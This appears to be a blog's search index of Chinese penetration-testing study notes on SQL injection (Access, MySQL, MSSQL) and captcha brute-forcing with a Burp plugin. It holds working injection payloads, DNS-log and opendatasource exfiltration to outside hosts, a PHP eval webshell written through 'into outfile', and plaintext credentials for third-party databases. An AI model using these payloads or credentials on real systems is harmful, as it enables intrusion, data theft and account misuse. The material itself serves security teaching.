<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Access_cookie注入</title>
    <url>/2023/08/21/Access-cookie%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>Access注入-cookie注入</p>
<h1 id="什么是Cookie？"><a href="#什么是Cookie？" class="headerlink" title="什么是Cookie？"></a>什么是Cookie？</h1><p>Cookie就是代表你身份的一串字符串，网站根据Cookie来识别你是谁，如果你获取了管理员的Cookie，你可以无需密码直接登陆管理员账号</p>
<h1 id="为什么可以Cookie注入-原理部分"><a href="#为什么可以Cookie注入-原理部分" class="headerlink" title="为什么可以Cookie注入(原理部分)"></a>为什么可以Cookie注入(原理部分)</h1><p>在动态脚本语言中存在超全局变量可以获取多种传参方式(基本上)<br>很多时候开发在开发的时候为了考虑到多种接受参数，在接受参数的时候都是用多种解释传参的方法<br>例如: php中的$_REQUEST[] 可以获取POST|GET|COOKIE传参<br>注：php 5.4以上版本就不会接受Cookie传参了。</p>
<p>如果说开发用了$_REQUEST[]来接受参数?然后我们的POST和GET传参被Waf拦截了怎么办？<br>那么也许Waf没有对Cookie进行检测，我们尝试用Cookie进行传参，然后不就可以绕过检测机制</p>
<h1 id="如何设置Cookie"><a href="#如何设置Cookie" class="headerlink" title="如何设置Cookie"></a>如何设置Cookie</h1><p>​        1、依靠浏览器进行设置[F12 找安全]<br>​        2、抓包直接修改<br>​        3、浏览器有的插件也可以设置Cookie<br>​        4、浏览器自带Js进行设置 [推荐]<br>​            document.cookie =&gt; 当前网站的Cookie有什么<br>​            document.cookie=”id=111111 “<br>​            Cookie注入最好是进行一次编码 ==&gt; document.cookie=”id=”+escape(“1”)</p>
<h1 id="什么网站存在Cookie注入"><a href="#什么网站存在Cookie注入" class="headerlink" title="什么网站存在Cookie注入"></a>什么网站存在Cookie注入</h1><p>​        1、ASP的站点存在可能性极高<br>​        2、PHP版本低于5.3的版本可能性极高</p>
<p>当然渗透的核心是尝试,不管有没有都试一试</p>
<h1 id="实现注入的步骤"><a href="#实现注入的步骤" class="headerlink" title="实现注入的步骤"></a>实现注入的步骤</h1><h2 id="1-找到字段数"><a href="#1-找到字段数" class="headerlink" title="1.找到字段数"></a>1.找到字段数</h2><p>通过document.cookie=”id=”+escape(“127 order by 3 “)</p>
<h2 id="2-需要用到exists-函数来确定返回值是否为真"><a href="#2-需要用到exists-函数来确定返回值是否为真" class="headerlink" title="2.需要用到exists()函数来确定返回值是否为真"></a>2.需要用到exists()函数来确定返回值是否为真</h2><p>document.cookie=”id=”+escape(“127 and exists(select * from admin)”)</p>
<h2 id="3-通过抓包对表名进行爆破-sqlmap常用表名"><a href="#3-通过抓包对表名进行爆破-sqlmap常用表名" class="headerlink" title="3.通过抓包对表名进行爆破(sqlmap常用表名)"></a>3.通过抓包对表名进行爆破(sqlmap常用表名)</h2><p>这一步骤得到表名有哪些</p>
<h2 id="4-找到显示位"><a href="#4-找到显示位" class="headerlink" title="4.找到显示位"></a>4.找到显示位</h2><p>document.cookie=”id=”+escape(“127 and 1=2 union select 1,2,3 <strong>from admin</strong>“) //和MySQL不一样的是access比较严谨,必须写明from某某表</p>
<h2 id="4-听过抓包对列名进行爆破-sqlmap常用列名"><a href="#4-听过抓包对列名进行爆破-sqlmap常用列名" class="headerlink" title="4.听过抓包对列名进行爆破(sqlmap常用列名)"></a>4.听过抓包对列名进行爆破(sqlmap常用列名)</h2><p>利用得到的显示位,对字段进行爆破,因为access没有MySQL的information_schema这个表,只能爆破</p>
<h2 id="5-得到数据"><a href="#5-得到数据" class="headerlink" title="5.得到数据"></a>5.得到数据</h2><p>有了表和字段利用cookie的联合查询注入可以得到数据</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Access_偏移注入</title>
    <url>/2023/08/21/Access-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="偏移注入的使用时机"><a href="#偏移注入的使用时机" class="headerlink" title="偏移注入的使用时机"></a>偏移注入的使用时机</h1><p>在SQL注入的时候会遇到一些无法查询列名的问题，比如系统自带数据库的权限不够而无法访问系统自带库。<br>当你猜到表名无法猜到字段名的情况下，我们可以使用偏移注入来查询那张表里面的数据。</p>
<h1 id="偏移注入原理"><a href="#偏移注入原理" class="headerlink" title="偏移注入原理"></a>偏移注入原理</h1><h2 id="1-库名-表名与表名-列名"><a href="#1-库名-表名与表名-列名" class="headerlink" title="1.库名.表名与表名.列名"></a>1.库名.表名与表名.列名</h2><p>select <em> from admin == select admin.</em> from admin == select 所有字段 from admin表 ==&gt; admin.* == admin表中的所有字段</p>
<h2 id="2-在查询语句中-admin-占了admin表中所有字段的字段数"><a href="#2-在查询语句中-admin-占了admin表中所有字段的字段数" class="headerlink" title="2.在查询语句中 admin.* 占了admin表中所有字段的字段数"></a>2.在查询语句中 admin.* 占了admin表中所有字段的字段数</h2><p>比如, 假设当前页面查询访问的是news表,有5个字段, 而admin表中有 id, username, password 三个字段, 且当前页面的构造的sql语句为 select <em> from news id = 1 and 1=2 union select 1,2,admin.</em>from admin ==&gt; union select 1,2,id,username,password from admin</p>
<h2 id="3-偏移注入的字段数要小于当前页面查询表的字段数"><a href="#3-偏移注入的字段数要小于当前页面查询表的字段数" class="headerlink" title="3.偏移注入的字段数要小于当前页面查询表的字段数"></a>3.偏移注入的字段数要小于当前页面查询表的字段数</h2><p>否则就不能进行偏移,查看其他非显错位的数据了,甚至都不会正确输出因为union select要求两边数据字段数相同</p>
<h2 id="4-如何在access数据库内进行类似limit的单行输出的操作"><a href="#4-如何在access数据库内进行类似limit的单行输出的操作" class="headerlink" title="4.如何在access数据库内进行类似limit的单行输出的操作?"></a>4.如何在access数据库内进行类似limit的单行输出的操作?</h2><p>用top 和 desc</p>
<p>​        id=105 and union select <strong>top 1</strong> 1,2,admin.<em> from admin order by 1 desc //查第一行的数据<br>==&gt;    id=105 and union select <strong>top 2</strong> 1,2,admin.</em> from admin order  by 1 desc //查第二行数据</p>
<p>document.cookie=’id=’+escape(“105 and 1=2 union select 1,1,1,1,1,1,1,1,1,1,admin.* from admin”)</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>App渗透</title>
    <url>/2023/08/21/App%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>CSRF-跨站请求伪造攻击</title>
    <url>/2023/08/21/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>DNS注入</title>
    <url>/2023/08/21/DNS%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="DNS注入原理"><a href="#DNS注入原理" class="headerlink" title="DNS注入原理"></a>DNS注入原理</h1><p>在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这个时候就可以通过DNS请求把想获得的数据外带出来。        </p>
<p>对于sql盲注，常见的方法就是二分法去一个个猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban。  </p>
<p>所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。在遇到盲注的时候可以快速得到数据,减少和目标的交互.</p>
<p>DNS注入 =&gt; DNS-LOG注入 【SQL注入的进阶】</p>
<p>数据库其实可以发起网络请求,特定的函数可以让他可以去远程获取数据,基本原理为:让他请求某个域名，然后域名的二级域名用子查询拼接<br>                    (select database()).baidu.com =&gt; maoshe.baidu.com</p>
<h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><h2 id="1、什么函数让数据库发起请求"><a href="#1、什么函数让数据库发起请求" class="headerlink" title="1、什么函数让数据库发起请求"></a>1、什么函数让数据库发起请求</h2><p> LOAD_FILE()   读取文件的函数       </p>
<p>读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p>
<p>这个功能不是默认开启的，为了安全性，除了特别低的版本外，他们设置安全性的锁,需要在mysql配置文件加一句 secure_file_priv=<br>因此,load_file()函数是有限制条件的,对面未开启这个安全模式时是不能进行dns注入的</p>
<p>它可以走文件共享协议去读取外部文件。用的是SMB协议（永恒之蓝）,<strong>所以目标是Linux不能使用dns注入(如果一个网站不允许访问外网也不能DNS注入)</strong></p>
<h2 id="2-UNC路径"><a href="#2-UNC路径" class="headerlink" title="2.UNC路径"></a>2.UNC路径</h2><p>通用命名规则，也称通用命名规范、通用命名约定.</p>
<p>UNC路径就是类似\softer这样的形式的网络路径。它符合 \\servername\sharename 格式，=&gt; <strong>文件共享 \\域名或IP\文件夹</strong></p>
<p>其中 servername 是服务器名，sharename 是共享资源的名称。目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\\servername\sharename\directory\filename。例如softer计算机的名为it168的共享文件夹，用UNC表示就是\\softer\it168。我们熟悉的命令行访问法访问网上邻居，实际上应该称作UNC路径访问法。不过UNC路径也可以这样写//servername/sharename   [强烈建议这样写,因为注意url中\转义字符,要\\,\\要变为\\\\]   </p>
<h2 id="3-load-file和unc路径结合"><a href="#3-load-file和unc路径结合" class="headerlink" title="3.load_file和unc路径结合"></a>3.load_file和unc路径结合</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">load_file(<span class="string">&#x27;//a.r5a991.dnslog.cn/1select23&#x27;</span>)</span><br><span class="line"></span><br><span class="line">load_file(concat(<span class="string">&#x27;//&#x27;</span>,database(),<span class="string">&#x27;.r5a991.dnslog.cn/123&#x27;</span>))</span><br><span class="line"></span><br><span class="line">load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;.qelgp1.dnslog.cn/123&#x27;</span>))</span><br><span class="line"></span><br><span class="line">load_file(<span class="string">&#x27;//douphp.qelgp1.dnslog.cn/123&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>​    先执行子查询、执行了语句、最后开始Load_file，然后DNS有信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#拼接之后就相当于:</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;//error.1806dl.dnslog.cn/abc&#x27;</span>);</span><br><span class="line">#数据库去访问error<span class="number">.1806</span>dl.dnslog.cn的服务器下的共享文件夹abc然后<span class="number">1806</span>dl.dnslog.cn的子域名的解析都是在某台服务器，然后他记录下来了有人请求访问了error<span class="number">.1806</span>dl.dnslog.cn，然后在DnsLog这个平台上面显示出来了</span><br></pre></td></tr></table></figure>
<h2 id="4-如何才能看到DNS日志"><a href="#4-如何才能看到DNS日志" class="headerlink" title="4.如何才能看到DNS日志?"></a>4.如何才能看到DNS日志?</h2><h3 id="理论上"><a href="#理论上" class="headerlink" title="理论上:"></a>理论上:</h3><p>你需要自己搭建一台有公网IP的DNS服务器+购置新的域名(在域名设置中把域名的DNS指向你搭建的机器)<br>公网IP服务器（如果不是学生机要69/月） + 域名 （需要钱）便宜域名 .xyz </p>
<h3 id="实际上"><a href="#实际上" class="headerlink" title="实际上:"></a>实际上:</h3><p>前辈已经帮你们搭了，有成套的DNS-LOG网站</p>
<h1 id="课程外干货"><a href="#课程外干货" class="headerlink" title="课程外干货"></a>课程外干货</h1><h2 id="1-白名单"><a href="#1-白名单" class="headerlink" title="1.白名单"></a>1.白名单</h2><p>名单上的东西都是安全的，不检测</p>
<p>因为对于txt,jpg文件进行传参不可能造成sql注入,所以老版本的安全狗不会检测后缀为.txt等的文件传承[大部分的漏洞是因为理解产生了偏差,对于waf的理解,对于web容器理解的不同]</p>
<p>index3.php<br>index3.php/123.txt  </p>
<p>以上俩路径返回的页面是一样的,因为找不到123.txt,所以就会网上级找,找到index3.php,这是nginx的一个特性</p>
<h2 id="2-拿下目标服务器"><a href="#2-拿下目标服务器" class="headerlink" title="2.拿下目标服务器"></a>2.拿下目标服务器</h2><p>能打dns_log说明安全模式取消了。如果你权限够(以后会学提权)，且没有过滤的情况,可以尝试用webshell =&gt; 网站的木马（只要把webshell放到目标的网站根目录，就可以控制目标服务器）</p>
<h3 id="PHP代码"><a href="#PHP代码" class="headerlink" title="PHP代码:"></a>PHP代码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>​                                   =&gt;$_REQUEST[8] 接受8的传参<br>​                                   =&gt;eval 把字符串当作后端代码进行执行<br>​                                   =&gt; PHP代码很强大、执行系统命令、读取文件、删除文件、查看信息、发起请求都可以做到<br>​                                   =&gt; 利用工具。webshell管理工具（内置了一些功能，然后他会通过内置的PHP代码去传参）<br>​                                   =&gt; 最有名的就是：菜刀/蚁剑</p>
<h3 id="webshell最大的难点："><a href="#webshell最大的难点：" class="headerlink" title="webshell最大的难点："></a>webshell最大的难点：</h3><p>如何把我的木马放到目标网站的根目录 （文件上传）</p>
<p>解析漏洞：把文件当作PHP来执行 =&gt; 大部分的网站都是看后缀的.</p>
<p>=&gt;如果能上传一个.php文件且里面代码会执行，那基本上对面的服务器你就拿下了.</p>
<p>web容器 =&gt; 根据后缀判断需要让谁处理。 TXT\JPG\PHP\JSP(此处关联上面的白名单内容)</p>
<h3 id="在数据库中："><a href="#在数据库中：" class="headerlink" title="在数据库中："></a>在数据库中：</h3><p>导出数据库语句查询结果</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">into</span> outfile  #导出多行</span><br><span class="line"><span class="keyword">into</span> dumpfile #导出单行</span><br></pre></td></tr></table></figure>
<p>导出文件</p>
<p>大部分的中小型网站，数据库和网站都是在一起的</p>
<p>让目标网站报错以获取绝对路径：传参后面加[]  =&gt; id[]=123 , 因为这样子你的传参就是数组</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">into</span> outfile <span class="string">&#x27;C:/phpStudy/WWW/8.txt&#x27;</span></span><br></pre></td></tr></table></figure>
<p>​                               </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `news` <span class="keyword">WHERE</span> `id`<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;&lt;?php eval($_REQUEST[8])?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/phpStudy/WWW/6.php&#x27;</span></span><br></pre></td></tr></table></figure>
<p>sqlmap拿shell =&gt; 也是基于这个拿的</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt_Strike(CS)</title>
    <url>/2023/08/21/Cobalt-Strike-CS/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>EasyXssPaylod</title>
    <url>/2023/08/21/EasyXssPaylod/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Oracle_报错注入</title>
    <url>/2023/08/21/Oracle-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>XXE实体注入</title>
    <url>/2023/08/21/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>SSRF-服务器请求伪造攻击</title>
    <url>/2023/08/21/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>MsSQL和反弹注入</title>
    <url>/2023/08/21/MsSQL%E5%92%8C%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>mssql  =&gt; 就是  Sql Server</p>
<p>mysql,mssql,Oracle,Access 并肩称作为四大主流数据库</p>
<h1 id="1-mssql的显错注入-联合查询注入"><a href="#1-mssql的显错注入-联合查询注入" class="headerlink" title="1.mssql的显错注入(联合查询注入)"></a>1.mssql的显错注入(联合查询注入)</h1><h2 id="1-null的用法"><a href="#1-null的用法" class="headerlink" title="(1)null的用法"></a>(1)null的用法</h2><p>MSSQL的语法要求很严谨,不同类型的数据不能同时输出,所以判断出来字段数后需要用万能的null进行类型识别,一个一个排除,最终确定是否是int还是char</p>
<p><img src="C:\Users\dtxha\AppData\Roaming\Typora\typora-user-images\image-20230304094152995.png" alt="image-20230304094152995"></p>
<h2 id="2-MSSQL-没有database-函数"><a href="#2-MSSQL-没有database-函数" class="headerlink" title="(2)MSSQL 没有database()函数"></a>(2)MSSQL 没有database()函数</h2><p>所以查询的时候不能加where table_schema=database()</p>
<h2 id="3-MSSQL的正统查询方法"><a href="#3-MSSQL的正统查询方法" class="headerlink" title="(3)MSSQL的正统查询方法"></a>(3)MSSQL的正统查询方法</h2><p>有些版本为了兼容MySQL用户的使用习惯,开发人员加了information_schema库等,但是正统的MSSQL做法如下</p>
<p>1.U类型是用户创建的库, 而S类型是系统自带库</p>
<p>2.因为没有information_schema作为表和字段的链接,所以mssql采用一个id作为字段与表的绑定(syscolumn里存在所有字段),此外,正统的为sysobjects(系统自带库,即所有表的集合),syscolumns.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; union select * from sysobjects where xtype=&#x27;u&#x27;-- qwe//查到表名,id等</span><br><span class="line"></span><br><span class="line">1&#x27; union select id,name,null from sysobjects where xtype=&#x27;U&#x27; -- qwe  //查到表名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#x27; union select id,name,null from syscolumns where id=1977058079 -- qwe //查到字段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1 and 1=2 union select id,name,token from admin-- qwe</span><br></pre></td></tr></table></figure>
<h2 id="4-逐条输出-重点"><a href="#4-逐条输出-重点" class="headerlink" title="(4)逐条输出[重点]"></a>(4)逐条输出[重点]</h2><p>因为mssql没有<strong>limit x,y</strong>  这个函数,所以不能做到很方便的逐条输出,然而大部分的网站都只能输出数据,而不会输出一个表</p>
<p>1.如果数据少,可以逐条排除,比如看完第一条数据,查询语句之后加一个条件 and ‘字段’&lt;&gt;’第一条数据’(&lt;&gt;和!=都是不等于的意思),这样就可以一直只显示一条,但是数量太多时就不要这样了,太累,数据也太多</p>
<p>2.所以这时候需要用到<strong>top</strong>方法,这时候access和mssql里的方法.此外还需要嵌套一条子查询配合<strong>not in</strong>语法进行排除查询过的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//具体语法</span><br><span class="line">select top 条数 字段 from 表名</span><br><span class="line"></span><br><span class="line">//前100条在ABC表的pp字段</span><br><span class="line">select top 100 pp from ABC;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select top 1  name from sysobjects where name not in (select top 1 name from sysobjects)</span><br><span class="line">//这样进行嵌套,可以做到逐条输出数据</span><br><span class="line"></span><br><span class="line">select top 1  name from sysobjects where name not in (select top 30 name from sysobjects)</span><br></pre></td></tr></table></figure>
<h2 id="5-union-all"><a href="#5-union-all" class="headerlink" title="(5)union all"></a>(5)union all</h2><p>有时候重复数据union会自动去重,用union all可以查询所有</p>
<h1 id="2-MSSQL的反弹注入"><a href="#2-MSSQL的反弹注入" class="headerlink" title="2.MSSQL的反弹注入"></a>2.MSSQL的反弹注入</h1><h2 id="1-opendatasource-函数"><a href="#1-opendatasource-函数" class="headerlink" title="(1)opendatasource()函数"></a>(1)opendatasource()函数</h2><p>主要利用的是这个链接函数,把网站数据库查询到的内容插入到外部其他数据库</p>
<h2 id="2-两个白嫖的数据库"><a href="#2-两个白嫖的数据库" class="headerlink" title="(2)两个白嫖的数据库"></a>(2)两个白嫖的数据库</h2><p>地址：den1.mssql8.gear.host<br>初始化库：zkaqzkaq1n<br>账户名：zkaqzkaq1n<br>密码：Rz7VjmvQ!6e~</p>
<p>连接地址：SQL5095.site4now.net<br>库名： DB_14DC259_a94<br>用户名：DB_14DC259_a94_admin<br>密码：nsqvcf96310</p>
<h2 id="3-语法原理结构"><a href="#3-语法原理结构" class="headerlink" title="(3)语法原理结构"></a>(3)语法原理结构</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5009.webweb.com,1433;uid=DB_14A5E44_zkaq_admin;pwd=zkaqzkaq;database=DB_14A5E44_zkaq&#x27;).DB_14A5E44_zkaq.dbo.temp select * from admin --qwe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>1.堆叠注入:用户输入的分号能够生效，把前面的SQL语句给完结，后面写的SQL语句能执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;select name from sysobjects WAITFOR DELAY &#x27;0:0:15&#x27; -- qwe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//MSSQL的延时(没有sleep()了)   WAITFOR DELAY &#x27;0:0:4&#x27; --   表示延迟4秒</span><br></pre></td></tr></table></figure>
<p>2.库.表.字段　　＝＞　连接.库.dbo.表.字段</p>
<p>3.obb(数据外带) : 通过一定手法,让目标主动的把我们想要的数据发送出来(比如dns注入)</p>
<h2 id="4-整体代码"><a href="#4-整体代码" class="headerlink" title="(4)整体代码"></a>(4)整体代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=den1.mssql8.gear.host,1433;uid=zkaqzkaq1n;pwd=Rz7VjmvQ!6e~;database=zkaqzkaq1n&#x27;).zkaqzkaq1n.dbo.abcd select id,name,xtype,uid from sysobjects -- qwe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Xss-跨站脚本攻击</title>
    <url>/2023/08/21/Xss-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>metasploit基本使用</title>
    <url>/2023/08/21/metasploit%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>captcha插件介绍</title>
    <url>/2023/08/21/captcha%E6%8F%92%E4%BB%B6%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>想必大家都会使用burp进行爆破,当遇到带验证码的登录表单进行爆破时,基本尝试抓包后观察验证码是否主动更新,或者进行验证码绕过,机缘巧合下我接触到了captcha-killer这个插件,可以提供给大家第三种爆破思路<strong>(我的插件和脚本打包放在<a href="https://bbs.zkaq.cn/t/30615/3.html" title="掌控安全社区">zkaq</a>的附件里了,插件也可以从GitHub下载)</strong><br>(<a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a> “GitHub下载链接以及部分资料地址”)</p>
<h2 id="什么是captcha-killer"><a href="#什么是captcha-killer" class="headerlink" title="什么是captcha-killer?"></a>什么是captcha-killer?</h2><p>总的来说,它是个用Java写的插件,可以无缝衔接于burp.但是他只是一个调用接口,并不进行识别的操作,真正进行验证码识别处理的是两个个用Python脚本(codereg.py)调用的两个接口(ddddocr和aiohttp), 稍后我会进行简明的介绍<br>captcha-killer设计理念是只专注做好对各种验证码识别技术接口的调用, 说具体点就是burp通过这一个插件，就可以适配各种验证码识别接口，无需重复编写调用代码.<br>今天不谈编码层面如何实现(主要是我也不会)，感兴趣的同学可以去github看源码. 此篇文章只通过使用步骤来说明使用方法</p>
<h2 id="简要介绍codereg-py"><a href="#简要介绍codereg-py" class="headerlink" title="简要介绍codereg.py"></a>简要介绍codereg.py</h2><p>个人理解,这个脚本的整体识别流程是通过python在本地开启一个验证码识别的web接口来接收captcha-killer传来的验证码图片内容，然后调用识别服务(利用机器学习)来识别，最后返回结果给captcha-killer. </p>
<hr>
<hr>
<h1 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h1><p><strong><em>ok废话不多说,这里是正题!!!!!!!!!!!!</em></strong></p>
<h2 id="1-安装插件"><a href="#1-安装插件" class="headerlink" title="1.安装插件"></a>1.安装插件</h2><p>首先打开burp,选择Extender——&gt;Add（默认Java类型插件）————&gt;Select File——&gt;选择下载的captcha-killer-modified-jdk14.jar文件<br><img src="https://nc0.cdn.zkaq.cn/md/17628/965ea03bb3e0a551789e1810e45e7ac2_24004.png" alt=""></p>
<p>发现任务栏里多出一个captcha-killer,就说明安装成功,如下图↓</p>
<p><img src="https://nc0.cdn.zkaq.cn/md/17628/afe2e33d4bf109c274064e3193deb139_39339.png" alt=""></p>
<hr>
<hr>
<h2 id="2-获取目标网站验证码"><a href="#2-获取目标网站验证码" class="headerlink" title="2.获取目标网站验证码"></a>2.获取目标网站验证码</h2><h3 id="1-找到要爆破的网站并打开burp-我找到了一个网站作为案例-并未进行爆破"><a href="#1-找到要爆破的网站并打开burp-我找到了一个网站作为案例-并未进行爆破" class="headerlink" title="(1)找到要爆破的网站并打开burp,我找到了一个网站作为案例(并未进行爆破)"></a>(1)找到要爆破的网站并打开burp,我找到了一个网站作为案例(并未进行爆破)</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/a88df494a58751c3333052ed746c402a_61201.png" alt=""></p>
<h3 id="2-开始抓包-点击验证码刷新-拦截此次请求"><a href="#2-开始抓包-点击验证码刷新-拦截此次请求" class="headerlink" title="(2)开始抓包,点击验证码刷新,拦截此次请求"></a>(2)开始抓包,点击验证码刷新,拦截此次请求</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/b45d29a283bd138950dd5943964389a3_32909.png" alt=""></p>
<h3 id="3-鼠标右键-将这个包发送到captcha-killer模组里"><a href="#3-鼠标右键-将这个包发送到captcha-killer模组里" class="headerlink" title="(3)鼠标右键,将这个包发送到captcha-killer模组里"></a>(3)鼠标右键,将这个包发送到captcha-killer模组里</h3><p>[‘extensions’—-&gt;’captcha-killer’—&gt;’send to captcha panel’]</p>
<p><img src="https://nc0.cdn.zkaq.cn/md/17628/c28253542fb19f8fc1b7f511def8c7ad_75826.png" alt=""></p>
<h3 id="4-点击任务栏里的插件模组-可以看到数据包已经自动填入-点击获取按钮-可以获取数据包内的图片验证码-此时获取验证码的流程已经走完-接下来的任务是进行识别"><a href="#4-点击任务栏里的插件模组-可以看到数据包已经自动填入-点击获取按钮-可以获取数据包内的图片验证码-此时获取验证码的流程已经走完-接下来的任务是进行识别" class="headerlink" title="(4)点击任务栏里的插件模组,可以看到数据包已经自动填入,点击获取按钮,可以获取数据包内的图片验证码,此时获取验证码的流程已经走完,接下来的任务是进行识别"></a>(4)点击任务栏里的插件模组,可以看到数据包已经自动填入,点击获取按钮,可以获取数据包内的图片验证码,此时获取验证码的流程已经走完,接下来的任务是进行识别</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/449e70473ea282bd66f4443e32efd594_50672.png" alt=""></p>
<h2 id="3-开启本地验证码识别服务"><a href="#3-开启本地验证码识别服务" class="headerlink" title="3.开启本地验证码识别服务"></a>3.开启本地验证码识别服务</h2><p>本文实验的python版本环境：Python 3.9.4</p>
<h3 id="1-python中安装ddddocr和aiohttp包"><a href="#1-python中安装ddddocr和aiohttp包" class="headerlink" title="(1)python中安装ddddocr和aiohttp包"></a>(1)python中安装ddddocr和aiohttp包</h3><p>和其他第三方包的安装方式一样,在dos命令中写入以下命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install ddddocr aiohttp -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com </span><br></pre></td></tr></table></figure>
<p>这样就是安装成功了<br><img src="https://nc0.cdn.zkaq.cn/md/17628/40a024b0479ea701d916652a3ee59b24_26796.png" alt=""></p>
<h3 id="2-用python运行codereg-py脚本"><a href="#2-用python运行codereg-py脚本" class="headerlink" title="(2)用python运行codereg.py脚本"></a>(2)用python运行codereg.py脚本</h3><p>打开命令控制台(建议在当前文件夹下打开cmd,不用填路径也不用配环境变量)<br>运行以下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python codereg.py</span><br></pre></td></tr></table></figure>
<p><img src="https://nc0.cdn.zkaq.cn/md/17628/2628a5ee6290e8bc76736a3d325cfa92_39814.png" alt=""><br>显示ddddocr(本地验证码识别的web接口)已经运行成功,此时的接收端口为8888.<br>注意,这个dos面板不能关掉,否则ddddocr不会继续运行,也就不能进行识别了</p>
